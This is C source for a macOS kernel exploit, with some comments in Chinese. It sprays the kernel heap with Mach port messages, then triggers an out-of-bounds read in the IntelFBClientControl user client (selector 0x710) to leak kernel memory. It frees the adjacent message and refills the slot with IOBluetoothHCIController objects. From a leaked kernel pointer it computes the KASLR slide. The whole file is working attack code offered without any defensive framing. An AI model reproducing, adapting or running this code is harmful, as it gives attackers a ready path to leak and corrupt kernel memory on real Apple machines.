#include <mach-o/loader.h>
#include <sys/mman.h>
#include <pthread.h>
#include <mach/mach.h>
#include <sys/utsname.h>
#include <assert.h>
#include <IOKit/IOKitLib.h>
#include <IOKit/iokitmig.h>
#include <stdlib.h>
#include <stdio.h>
#define start 570
#define PORT_NUM 290000

typedef struct {
    mach_msg_header_t head;
    mach_msg_body_t msgh_body;
    mach_msg_ool_descriptor_t desc;
    mach_msg_type_number_t count;
} pzp;

mach_port_t *ports;

void heapInit(){
	ports = calloc(PORT_NUM, sizeof(mach_port_t));
    
    	for (int i = 0; i < PORT_NUM; i++) {
        	mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &ports[i]);
        	mach_port_insert_right(mach_task_self(), ports[i], ports[i], MACH_MSG_TYPE_MAKE_SEND);
    	}

    pzp msg1;
    memset(&msg1, 0, sizeof(pzp));
    pzp msg2;
    memset(&msg2, 0, sizeof(pzp));
    
    uint64_t* buffer = calloc(0x1000, sizeof(uint64_t));
    
    for (int i = 0; i < 0x1000; i++) {
        //这里是为了不让虚表处在outputStruct的开头，因为开头的低32位会被offset覆盖
        buffer[i] = 0xffffff8060002000-0x190;
    }
//    buffer[59] = 0x1;
    buffer[491] = 0;
    
    //init heap fengshui msg
    msg1.head.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
    msg1.head.msgh_local_port = MACH_PORT_NULL;
    msg1.head.msgh_size = sizeof(msg1);
    msg1.msgh_body.msgh_descriptor_count = 1;
    msg1.desc.address = buffer;
    msg1.desc.size = 0x1000-0x18; //64
    msg1.desc.type = MACH_MSG_OOL_DESCRIPTOR;
    msg1.desc.deallocate = FALSE;
    msg1.desc.copy = MACH_MSG_VIRTUAL_COPY;
    msg1.count = msg1.desc.size;
/* 
   // send  all
    pthread_yield_np();
    for (int i = 0; i < PORT_NUM; i++) {
        msg1.head.msgh_remote_port = ports[i];
        kern_return_t kret = mach_msg(&msg1.head, MACH_SEND_MSG, msg1.head.msgh_size, 0, 0, 0, 0);
        assert(kret==0);
    }
*/
    for(int i = 0 ; i < PORT_NUM ; i++) {
		  //表示是哪一个msg
      buffer[3]=i;
		  msg1.head.msgh_remote_port = ports[i];
		  kern_return_t kret = mach_msg(&msg1.head, MACH_SEND_MSG, msg1.head.msgh_size, 0, 0, 0, 0);
		  assert(kret==0);
	} 
		
    printf("[+]heap spray done..\n");
	return;

}

void alloc_userclient(){
		kern_return_t err;
		io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOBluetoothHCIController"));
		
		if(service == IO_OBJECT_NULL){
				printf("unable to find service\n");
				return;
		}
		io_connect_t conn = MACH_PORT_NULL;
		err = IOServiceOpen(service, mach_task_self(), 0, &conn);
		if(err != KERN_SUCCESS){
				printf("unable to open user client\n");
				return;
		}
		void *a = malloc(0x110);
		memset(a,0,0x100);
		void *b = malloc(0x110);
		memset(b,0,0x100);
		size_t size=0x4;

		*(uint64_t *)(a+0x38) = 0x4;
		*(uint64_t *)(a+0x40) = 0x4;
		*(uint64_t *)(a+0x48) = 0x28;
		*(uint64_t *)(a+0x50) = 0x8;
		*(uint64_t *)(a+0x60) = 0x2;
		*(uint64_t *)(a+0x84) = 0x4;
		
		//*(uint32_t *)(a+0x60) = 0x74;

		err = IOConnectCallMethod(conn,0,NULL,0,a,0x74,NULL,NULL,b,&size);
		if( err == KERN_SUCCESS)
				printf("create successfully\n");
		else
				printf("create fail:%x\n", err);
		return;
}


int main(int argc, char ** argv){
		heapInit();
		pzp msg2;
		memset(&msg2, 0, sizeof(msg2));
		kern_return_t err;
		
		io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IntelFBClientControl"));

		if(service == IO_OBJECT_NULL){
				printf("unable to find service\n");
				return 0;
		}

		io_connect_t conn = MACH_PORT_NULL;
		err = IOServiceOpen(service, mach_task_self(),0,&conn);
		if(err != KERN_SUCCESS){
				printf("unable to get user client\n");
				return 0;
		}

		uint64_t inputScalar[16];
		uint64_t inputScalarCnt = 0;
		
		char inputStruct[4096];
		size_t inputStructCnt = 4096;
		uint64_t outputScalar[16];
		uint32_t outputScalarCnt = 0;
		
		char outputStruct[4096];
		size_t outputStructCnt = 4096;
		memset(inputStruct, 0, inputStructCnt);
		memset(outputStruct, 0, outputStructCnt);
		*(uint64_t *)(inputStruct) = 0x493dde6;
		//*(uint32_t *)(inputStruct+4) = 8;
		//*(uint32_t *)(inputStruct+8) = 8;	

		err = IOConnectCallMethod(
				conn,
				0x710,
				inputScalar,
				inputScalarCnt,
				inputStruct,
				inputStructCnt,
				outputScalar,
				&outputScalarCnt,
				outputStruct,
				&outputStructCnt);
		
		if(err != KERN_SUCCESS){
				printf("failed, err code: %x\n", err);
				return 0;
		}
		uint64_t *leaked = (uint64_t *)(outputStruct);
		
		printf("msg_id: 0x%llx\n", leaked[10]);
		int msg_id = leaked[10];

		msg2.head.msgh_local_port = ports[msg_id];
		err = mach_msg(&msg2.head, MACH_RCV_MSG,0,sizeof(msg2), ports[msg_id],0,0);
    //销毁这个msg，方便之后用蓝牙对象做覆盖
		mach_port_deallocate(mach_task_self(), ports[msg_id]);
		mach_port_destroy(mach_task_self(), ports[msg_id]);	

		for(int i = 0 ; i < 100 ; i++)
				alloc_userclient();				

		getchar();
		getchar();
		err = IOConnectCallMethod(
				conn,
				0x710,
				inputScalar,
				inputScalarCnt,
				inputStruct,
				inputStructCnt,
				outputScalar,
				&outputScalarCnt,
				outputStruct,
				&outputStructCnt);
		for(int i =0 ; i < 10 ; i++)
		printf("0x%llx\n", leaked[4]);
		printf("0x%llx\n", leaked[4]-0xffffff7f82d2c998);
		return 0;

}
